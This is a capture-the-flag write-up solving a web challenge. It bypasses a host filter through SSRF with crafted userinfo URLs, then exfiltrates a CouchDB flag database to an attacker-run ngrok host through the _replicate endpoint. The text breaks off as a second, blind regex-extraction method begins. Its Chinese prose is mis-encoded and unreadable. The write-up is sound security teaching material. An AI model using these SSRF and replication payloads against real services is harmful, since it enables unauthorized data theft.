&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">stringJsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsFlag&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stringJsonObj&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ForbiddenResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BadRequestResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Request method is not accepted&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InternalServerErrorResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯¹ç»™å‡ºçš„urlï¼ˆé€šè¿‡urlå‚æ•°è¿›è¡Œæäº¤ï¼‰è¿›è¡Œgetæˆ–è€…postï¼Œå…ˆæ£€æŸ¥&lt;code>if (urlURI.getHost().contains(&amp;quot;couchdb&amp;quot;))&lt;/code>ï¼Œå¦‚æžœä¸ºçœŸç›´æŽ¥æŠ¥é”™ï¼›ä¹‹åŽå‘å‡ºè¯·æ±‚ å¦‚æžœ&lt;code>Utils.containsFlag(stringJsonObj)&lt;/code>ä¸ºçœŸä¹Ÿä¼šæŠ¥é”™å‡ºåŽ»&lt;/p>
&lt;p>æºç ç®—æ˜¯çœ‹å®Œäº†ï¼ŒæŽ¥ä¸‹æ¥æƒ³æƒ³è§£é¢˜çš„æ–¹æ³•ï¼ˆæœ‰éƒ¨åˆ†å…³äºŽssrfçš„å‰ç½®çŸ¥è¯†å¯ä»¥çœ‹è¿™ç¯‡é¼»ç¥–ppt - &lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - ðŸŠOrange Tsai&lt;/a>ï¼‰&lt;/p>
&lt;p>æœ¬åœ°å…ˆèµ·ä¸€ä¸ªçŽ¯å¢ƒï¼Œrun on localhost:8080ï¼Œ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl localhost:8080/testAPI?url&lt;span style="color:#f92672">=&lt;/span>https://couchdb:5984/&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>GET
Illegal!
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”±ä¹‹å‰çš„ä»£ç åˆ†æžæˆ‘ä»¬çŸ¥é“å› ä¸ºcouchdbçš„å­˜åœ¨æ‰€ä»¥illegalï¼Œä½†æ˜¯ä¸å¤ªé‡è¦ï¼ˆåæ­£ç»ˆä¼šè¢«ç»•è¿‡ï¼‰å…ˆåˆ›å»ºä¸€ä¸ªç”¨æˆ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl http://localhost:8080/createUser?username&lt;span style="color:#f92672">=&lt;/span>neptunian&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">=&lt;/span>neptunian
&lt;span style="color:#75715e"># Creating user&lt;/span>
success
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#75715e"># Listing &amp;#34;neptunian&amp;#34; database documents, using our credentials (jq formats our JSON output)&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#75715e"># Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;flag{fake}&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ˜¾ç„¶å½“æˆ‘ä»¬æ–°å»ºä¸€ä¸ªç”¨æˆ·æ—¶ï¼Œæˆ‘ä»¬çš„fake flagä¼šè¢«è‡ªåŠ¨æ’å…¥è¿™ä¸ªæ•°æ®åº“ä¸­ï¼Œå¹¶ä¸”ç›´æŽ¥curlæ˜¯å¯ä»¥å–å‡ºæ¥çš„ï¼Œä½†æ˜¯é¢˜ç›®æ˜¯ä¸èƒ½ç›´æŽ¥curl éœ€è¦ç¼åˆåˆ°é™å®šçš„testAPIä¸Šï¼Œå°è¯•æž„é€ ä¸€ä¸‹~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -vv http://localhost:8080/testAPI?method&lt;span style="color:#f92672">=&lt;/span>GET&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>http://neptunian:neptunian&lt;span style="color:#8045ff">\@&lt;/span>couchdb&lt;span style="color:#8045ff">\:&lt;/span>5984&lt;span style="color:#8045ff">\@&lt;/span>couchdb&lt;span style="color:#8045ff">\:&lt;/span>5984/neptunian
...
success
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ ·æž„é€ çš„urlå¹¶ä¸ä¼šè§¦å‘filterï¼Œä½†æ˜¯ç”±äºŽä»…ä»…è¿”å›žsuccessè€Œæ²¡æœ‰æ›´å¤šçš„ä¿¡æ¯ï¼Œä¸ºäº†éªŒè¯æ˜¯ä¸æ˜¯è§¦åŠåˆ°äº†couchdb serverï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ’å…¥ä¸€ä¸ªè‡ªå®šä¹‰çš„docï¼Œè¿™é‡Œç”¨pyè„šæœ¬ä¼ &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Accept&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e"># Simple POST Test&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#d88200">&amp;#34;some_int&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;some_string&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># Local&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://localhost:8080/testAPI&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 2,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>,
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-f8744c7d9e172ac4b188fbb8f337a204&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e"># There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09!&lt;/span>
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-f8744c7d9e172ac4b188fbb8f337a204&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;some_int&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;some_string&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¶³ä»¥è¯æ˜Žæˆ‘ä»¬è‡ªå·±æž„é€ çš„å¸¦testAPIçš„ç¼åˆæ€ªæ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œcouchdbç›¸å…³çš„å¢žåˆ æŸ¥æ”¹åŠŸèƒ½çš„&lt;/p>
&lt;p>è€Œé‡è¦çš„æ˜¯è¿œç¨‹ä¹Ÿèƒ½æ‰“é€šï¼Œè¿™é‡Œæœ‰è¿™ä¹ˆä¸ªå¥½ä¸œè¥¿https://docs.couchdb.org/en/3.1.1/replication/replicator.htmlï¼Œæˆ‘ä»¬åªéœ€è¦æž„é€ ä¸€ç»„postæ•°æ®å°±å¯ä»¥è¿œç¨‹å¾—åˆ°ä¸€ä»½æ•°æ®ï¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;source_db_name&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#f92672">&amp;#34;target&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://dest_user:dest_password@destination_host/dest_database&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è‡³äºŽåšæ³•å°±å¾ˆç®€å•äº†ï¼šå…ˆç”¨ngrokæžä¸€ä¸ªç½‘ä¸Šå¯è®¿é—®çš„couchdbï¼Œå¾—åˆ°ä¸´æ—¶çš„url &lt;a href="https://2d0a4710580a.ngrok.io">https://2d0a4710580a.ngrok.io&lt;/a>ï¼Œå…ˆåˆ›å»ºæ•°æ®åº“æ¥ä¾¿äºŽæŽ¥æ”¶ä¹‹åŽå¤åˆ¶çš„æ•°æ®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag
&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>:true&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽå°±å¯ä»¥åˆ©ç”¨replicatorå’Œç²¾å¿ƒæž„é€ çš„jsonæ•°æ®å¤§æžç‰¹æžäº†ï¼å…ˆæœ¬åœ°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Accept&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e"># POST Replication&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#d88200">&amp;#34;source&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;neptunian&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;target&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag&amp;#34;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># response = requests.get(&amp;#39;http://localhost:8080/testAPI&amp;#39;, headers=headers, params=params)&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://requester.mc.ax/testAPI&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-4bb8f6dafef84b2d856fe1444f38b0a2&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-4bb8f6dafef84b2d856fe1444f38b0a2&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¥½è€¶ï¼å¤åˆ¶æ€ªå¥½è€¶ï¼&lt;/p>
&lt;p>è™½ç„¶ä¸Šé¢è¯´äº†è¿™ä¹ˆå¤šï¼Œå…¶å®žæ ¸å¿ƒæ€è·¯ä¹ŸæŒºæ¸…æ™°çš„ï¼Œå°±æ˜¯å…ˆè®¤çœŸåˆ†æžæºç  æ‰¾å‡ºæ¼æ´žç‚¹æ˜¯ç”¨couchdbåˆ›å»ºç”¨æˆ·æ—¶ä¼šè‡ªåŠ¨æ’å…¥flag è¿™ä¸ªè¿‡ç¨‹æ˜¯ä½¿ç”¨httpè¯·æ±‚ æˆ‘ä»¬å¾ˆå®¹æ˜“å°±å¯ä»¥æž„é€ ä¸€ä¸ªurlåˆ›å»ºç”¨æˆ· è®©flagè¿›å…¥è‡ªå·±æŽŒæŽ§çš„æ•°æ®åº“ä¸­ï¼Œä¹‹åŽå°±å¯ä»¥é¡ºç•…çš„è¿›è¡Œæ•°æ®åº“çš„å¢žåˆ æŸ¥æ”¹ï¼›ä½†æ˜¯è¿™è¿˜éœ€è¦æŽ¥ä¸Šé¢˜ç›®ä¸­ç»™å‡ºçš„testAPIå…¥å£æ‰è¡Œï¼Œåˆç»è¿‡ä¸€äº›æž„é€ å¯ä»¥æˆåŠŸç¼åˆï¼›ä½†æ˜¯ç”±äºŽé¸¡è´¼çš„è®¾ç½® testAPIå¤„çš„è¯·æ±‚åªä¼šè¿”å›žæˆåŠŸæˆ–å¤±è´¥ï¼Œä¸ºäº†ç¡®åˆ‡çš„å¾—åˆ°flagï¼Œæˆ‘ä»¬åˆ©ç”¨äº†couchdbçš„_replicatorè¿™ä¸ªå¥½ä¸œè¥¿æ¥è¿›è¡Œä¸€ä¸ªæ•°æ®çš„å¤åˆ¶ï¼Œå¾—åˆ°flag~~~&lt;/p>
&lt;p>â€”â€”â€”â€”ä»¥ä¸‹æ˜¯ç¬¬äºŒç§è§£æ³•: char-by-char-blind-sqli&lt;/p>
&lt;p>æºç çš„åˆ†æžä¸å˜ï¼Œè¿™æ˜¯æ ¹æœ¬ï¼Œå·®å¼‚ä¹‹å¤„é¦–å…ˆåœ¨äºŽæž„é€ urlæ—¶è¿™é‡Œåˆ©ç”¨äº†couchdbçš„å¦ä¸€ä¸ªå¥½ä¸œè¥¿_find&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -X POST -H &lt;span style="color:#d88200">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://strellicsquad:12345@couchdb:5984/strellicsquad/_find&amp;#39;&lt;/span> --data &lt;span style="color:#d88200">&amp;#39;{&amp;#34;selector&amp;#34;:{&amp;#34;flag&amp;#34;: {&amp;#34;$regex&amp;#34;: &amp;#34;.*&amp;#34;}}}&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ¬åœ°æµ‹è¯•å¯ä»¥æˆåŠŸä¼šæ˜¾å‡ºflagï¼›ç¬¬äºŒä¸ªå·®å¼‚åœ¨ç¼åˆtestAPIçš„æ—¶å€™ï¼Œç”±äºŽfilterå¯¹äºŽå¤§å°å†™ä¸å¤ªæ•æ„Ÿï¼Œæ‰€ä»¥å¤§å†™Couchæ¥ç»•è¿‡äº†ï¼›åŒæ ·é¢ä¸´å›žæ˜¾åªæœ‰æˆåŠŸæˆ–å¤±è´¥ ä½†æ˜¯char-by-char-blind-sqliæ— æ‰€ç•æƒ§~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
